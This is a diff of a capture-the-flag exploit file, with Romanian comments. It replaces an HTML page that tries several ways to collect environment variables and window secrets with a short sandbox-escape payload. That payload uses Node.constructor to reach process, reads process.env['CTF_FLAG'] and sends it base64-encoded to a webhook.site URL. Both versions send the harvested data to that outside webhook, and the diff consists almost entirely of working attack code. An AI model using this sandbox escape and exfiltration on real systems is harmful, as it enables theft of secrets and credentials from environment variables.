@@ -1,35 +1,7 @@
-<!DOCTYPE html>
-<html>
-<body>
-    <script>
-        (async () => {
-            let secrete = {};
-            try {
-                // Strategia 1: Căutăm în obiectul global prin "frames"
-                const global = window.frames.constructor('return this')();
-                secrete.env = global.process ? global.process.env : "no_process";
+// Payload-ul corect conform laboratorului:
+const outerRealmFunctionConstructor = Node.constructor;
+const process = new outerRealmFunctionConstructor("return process")();
+const flag = process.env['CTF_FLAG'];
 
-                // Strategia 2: Căutăm orice variabilă care conține cuvântul "FLAG" în window
-                for (let key in window) {
-                    if (key.toLowerCase().includes('flag')) {
-                        secrete[key] = window[key];
-                    }
-                }
-
-                // Strategia 3: Încercăm să obținem flag-ul prin eroarea constructorului de obiecte
-                try {
-                    Object.defineProperty(Object.prototype, 'get_flag', {
-                        get() { return this.process ? this.process.env : 'failed'; },
-                        configurable: true
-                    });
-                    secrete.proto_exploit = get_flag;
-                } catch(e) {}
-
-                fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?RAPORT=" + btoa(JSON.stringify(secrete)));
-            } catch (e) {
-                fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?ULTIMUL_STADIU=" + btoa(e.message));
-            }
-        })();
-    </script>
-</body>
-</html>
+// Trimite flag-ul către webhook-ul tău:
+fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?FLAG=" + btoa(flag));
